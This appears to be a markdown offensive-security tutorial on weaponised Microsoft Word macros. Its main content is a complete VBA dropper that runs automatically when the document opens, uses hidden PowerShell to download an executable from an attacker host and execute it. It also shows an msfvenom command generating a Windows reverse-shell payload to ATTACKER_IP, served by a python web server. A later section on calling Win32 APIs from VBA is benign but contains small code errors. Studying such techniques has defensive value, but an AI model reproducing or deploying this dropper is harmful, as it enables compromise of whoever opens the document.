# Microsoft Word Macros
A basic exploit using powershell.

## 1. Create VBA Script
This VBA script will interact with Powershell to download a payload from a remote server.

### File Download Method
The following method will download a file from our attacking machine. 
```ps
(New-Object System.Net.WebClient).DownloadFile('http://10.10.10.10/x.exe', 'x.exe')
```

### VBA Code
Set the powershell code to a string variable, call that string using the `shell` method and `vbHide` the output from the user.
```vb
Dim str As String
str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://10.10.10.10/x.exe', 'x.exe')
Shell str, vbHide
```

### Downloading with VBA
MSWord does not have `WAIT` or `SLEEP` functions. We'll need to custom build it
- Set a variable `n` to take a time in seconds.
- Set a variable `t` to take the `Now` datetime.
- `DateAdd` takes interval of time `s`, seconds to wait `w` , and current time `t`
- Create a `Do` loop until `now` is greater than the returned value from `DateAdd`
- Call `DoEvents` allowing word to continue.

```vb
Sub Document_Open()
    Exploit
End Sub

Sub AutoOpen()
    Exploit
End Sub

Sub Exploit()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://10.10.10.10/x.exe','x.exe')"
    Shell str, VbHide
    Dim exePath As String
    exePath = ActiveDocument.Path & "\" & "x.exe"
    Wait (2)
    Shell exePath, vbHide
End Sub

Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
```

## 2. Generate Payload & Host
Generate a payload using `msfvenom` and serve it from a python webserver
```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o payload.exe

# Start python server
python3 -m http.server
```

## 3. Calling Win32 APIs
Win32 apis are located in dynamic link libraries (DLL). We can access them by using the `Declare` function. 

The following function prototype will display the username:
```
BOOL GetUserNameA(
    LPSTR lpBuffer,
    LPDWORD pcbBuffer
);
```

### 3.1 Translating C -> VBA
If the data types match, we can pass them with `ByVal`. 

| C | VBA | Translation |
| - | --- | ----------- | 
| `LPSTR` | `String` | `ByVal` | 
| `LPDWORD` | `Long` | `ByRef` |
| `BOOL` | `Long` | |
These function arguments need to be translated to their VBA equivalents. 

### 3.2 Import target function
When working on 64-bit we must also supply the `PtrSafe`. The final declare statement must be placed outside the procedure.
```
Private Declare PtrSafe Function GetUserName Lib "apvapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, ByRef nSize As Long) As Long
```

### 3.3 Declare Variables
we will declare 3 variables: return value, output buffer and size of output buffer:
```
Function MyMacro()
    Dim res As Long
    Dim MyBuff As String * 256
    Dim MySize As Long
    MySize 256
    res = GetUserName(MyBuff, MySize)
End Function
```

`MyBuff` can contain up to 256 characters, but we don't know the length of the actual username. In C, strings are terminated by a null byte. 

## InStr Function
This function will get the index of a null byte terminator. 
- Define the starting location as `1` ,
- Set search string as the `null` byte
- Subtract 1 from the result to get the string length

```
Dim strlen As Long
strlen = inStr(1, MyBuff, vbNullChar) - 1
MsgBox Left$(MyBuff, strlen)
```

## 4. Printing Result
Print the non-null characters with the `Left` method. Left creates a substring of the first argument with the size of it's second argument.

## 5. Completed API Call
This api call will get the current user name. Note The Left function is to display a substring starting from the left.

```
Private Declare PtrSafe Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, ByRef nSize As Long) As Long

Function X()
    Dim res As Long
    Dim MyBuff As String * 256
    Dim MySize As Long
    Dim strlen As Long
    MySize = 256
    res = GetUserName(MyBuff, MySize)
    strlen = InStr(1, MyBuff, vbNullChar) - 1
    MsgBox Left$(MyBuff, strlen)
End Function
```
